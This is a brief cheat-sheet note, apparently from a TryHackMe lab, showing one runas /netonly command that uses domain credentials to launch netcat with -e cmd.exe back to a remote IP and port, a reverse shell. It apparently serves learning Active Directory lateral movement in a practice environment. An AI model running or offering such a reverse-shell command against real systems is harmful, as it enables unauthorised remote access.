tags: #runas

Runas from a remote computer from cmd
```cmd
runas /netonly /user:za.tryhackme.com\t_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.130.40 4443"
```
